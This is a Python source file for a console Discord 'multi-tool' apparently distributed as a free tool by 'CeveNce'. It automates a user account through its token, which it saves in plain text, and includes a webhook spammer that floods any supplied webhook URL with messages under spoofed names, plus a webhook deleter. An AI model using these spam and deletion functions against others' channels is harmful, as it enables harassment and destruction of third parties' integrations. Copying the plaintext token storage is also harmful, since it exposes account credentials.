import os
import json
import requests
import time
from colorama import Fore, init

init()

CONFIG_FILE = "cevence_config.json"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print(f"""{Fore.RED}
   ██████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║     █████╗  ██║   ██║█████╗  ██╔██╗ ██║██║     █████╗  
  ██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ╚██████╗███████╗ ╚████╔╝ ███████╗██║ ╚████║╚██████╗███████╗
   ╚═════╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
    {Fore.RESET}""")
    print("Free Discord Tool\n")

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"token": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def validate_token(token):
    headers = {"Authorization": token}
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return response.status_code == 200
    except:
        return False

def get_token_info(token):
    headers = {"Authorization": token}
    try:
        user = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
        return {
            "username": f"{user['username']}#{user['discriminator']}",
            "user_id": user['id'],
            "email": user.get('email', 'No email'),
            "phone": user.get('phone', 'No phone'),
            "verified": user.get('verified', False)
        }
    except:
        return None

def leave_all_servers(token):
    headers = {"Authorization": token}
    try:
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    except:
        print(Fore.RED + "Failed to fetch guilds. Check your token or connection." + Fore.RESET)
        return
    
    if isinstance(guilds, list):
        for guild in guilds:
            guild_id = guild['id']
            try:
                response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
                if response.status_code == 204:
                    print(Fore.GREEN + f"Left guild: {guild['name']}" + Fore.RESET)
                else:
                    print(Fore.YELLOW + f"Failed to leave guild: {guild['name']} (Status: {response.status_code})" + Fore.RESET)
                time.sleep(1)
            except:
                print(Fore.RED + f"Error leaving guild: {guild['name']}" + Fore.RESET)
    else:
        print(Fore.RED + "Invalid response from Discord API." + Fore.RESET)

def webhook_spammer():
    webhook_url = input("Enter webhook URL: ")
    message = input("Enter message to spam: ")
    count = int(input("Enter number of times to send: "))
    delay = float(input("Enter delay between messages (seconds): "))
    
    for i in range(count):
        try:
            payload = {"content": message, "username": f"CeveNce Spammer {i+1}"}
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print(Fore.GREEN + f"Sent message {i+1}/{count}" + Fore.RESET)
            else:
                print(Fore.YELLOW + f"Failed to send message {i+1} (Status: {response.status_code})" + Fore.RESET)
        except:
            print(Fore.RED + f"Error sending message {i+1}" + Fore.RESET)
        time.sleep(delay)

def webhook_deleter():
    webhook_url = input("Enter webhook URL to delete: ")
    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            print(Fore.GREEN + "Webhook deleted successfully!" + Fore.RESET)
        else:
            print(Fore.YELLOW + f"Failed to delete webhook (Status: {response.status_code})" + Fore.RESET)
    except:
        print(Fore.RED + "Error deleting webhook" + Fore.RESET)

def clear_all_dms(token):
    headers = {"Authorization": token}
    try:
        channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    except:
        print(Fore.RED + "Failed to fetch DM channels. Check your token or connection." + Fore.RESET)
        return
    
    if isinstance(channels, list):
        for channel in channels:
            if channel['type'] == 1:
                recipient = channel['recipients'][0]['username']
                try:
                    messages = requests.get(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers).json()
                    if isinstance(messages, list):
                        for message in messages:
                            try:
                                response = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}/messages/{message['id']}", headers=headers)
                                if response.status_code == 204:
                                    print(Fore.GREEN + f"Deleted message from {recipient}" + Fore.RESET)
                                else:
                                    print(Fore.YELLOW + f"Failed to delete message from {recipient} (Status: {response.status_code})" + Fore.RESET)
                                time.sleep(0.5)
                            except:
                                print(Fore.RED + f"Error deleting message from {recipient}" + Fore.RESET)
                except:
                    print(Fore.RED + f"Error fetching messages from {recipient}" + Fore.RESET)
    else:
        print(Fore.RED + "Invalid response from Discord API." + Fore.RESET)

def main():
    config = load_config()
    token = config.get("token", "")
    
    while True:
        show_banner()
        
        if token:
            token_info = get_token_info(token)
            if token_info:
                print(Fore.CYAN + f"Logged in as: {token_info['username']} (ID: {token_info['user_id']})" + Fore.RESET)
            else:
                print(Fore.RED + "Invalid token set. Please set a new token." + Fore.RESET)
                token = ""
        
        print(f"""
{Fore.RED}╔════════════════════════════════════════╗
║              {Fore.WHITE}MENU OPTIONS{Fore.RED}              ║
╠════════════════════════════════════════╣
║ {Fore.WHITE}1. Set/Change Token                  {Fore.RED}║
║ {Fore.WHITE}2. Check Token Info                  {Fore.RED}║
║ {Fore.WHITE}3. Leave All Servers                 {Fore.RED}║
║ {Fore.WHITE}4. Webhook Spammer                   {Fore.RED}║
║ {Fore.WHITE}5. Webhook Deleter                   {Fore.RED}║
║ {Fore.WHITE}6. Clear All DMs                     {Fore.RED}║
║ {Fore.WHITE}0. Exit                              {Fore.RED}║
╚════════════════════════════════════════╝{Fore.RESET}
""")
        
        choice = input("\nSelect an option: ")
        
        if choice == "1":
            new_token = input("Enter your Discord token: ").strip()
            if validate_token(new_token):
                token = new_token
                config["token"] = token
                save_config(config)
                print(Fore.GREEN + "Token set successfully!" + Fore.RESET)
            else:
                print(Fore.RED + "Invalid token. Please try again." + Fore.RESET)
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            if token:
                token_info = get_token_info(token)
                if token_info:
                    print("\nToken Information:")
                    print(f"Username: {token_info['username']}")
                    print(f"User ID: {token_info['user_id']}")
                    print(f"Email: {token_info['email']}")
                    print(f"Phone: {token_info['phone']}")
                    print(f"Verified: {token_info['verified']}")
                else:
                    print(Fore.RED + "Failed to fetch token information." + Fore.RESET)
            else:
                print(Fore.RED + "No token set. Please set a token first." + Fore.RESET)
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            if token:
                print(Fore.YELLOW + "\nWARNING: This will make you leave ALL servers. Continue? (y/n)" + Fore.RESET)
                confirm = input().lower()
                if confirm == 'y':
                    leave_all_servers(token)
            else:
                print(Fore.RED + "No token set. Please set a token first." + Fore.RESET)
            input("\nPress Enter to continue...")
        
        elif choice == "4":
            webhook_spammer()
            input("\nPress Enter to continue...")
        
        elif choice == "5":
            webhook_deleter()
            input("\nPress Enter to continue...")
        
        elif choice == "6":
            if token:
                print(Fore.YELLOW + "\nWARNING: This will attempt to delete ALL messages in ALL DMs. Continue? (y/n)" + Fore.RESET)
                confirm = input().lower()
                if confirm == 'y':
                    clear_all_dms(token)
            else:
                print(Fore.RED + "No token set. Please set a token first." + Fore.RESET)
            input("\nPress Enter to continue...")
        
        elif choice == "0":
            print(f"\n{Fore.RED}Thanks for using CeveNce Multi-Tool!{Fore.RESET}")
            break
        
        else:
            print(Fore.RED + "Invalid option. Please try again." + Fore.RESET)
            input("\nPress Enter to continue...")
        
        clear_screen()

    print(f"\n{Fore.RED}Made by CeveNce{Fore.RESET}")

if __name__ == "__main__":
    main()
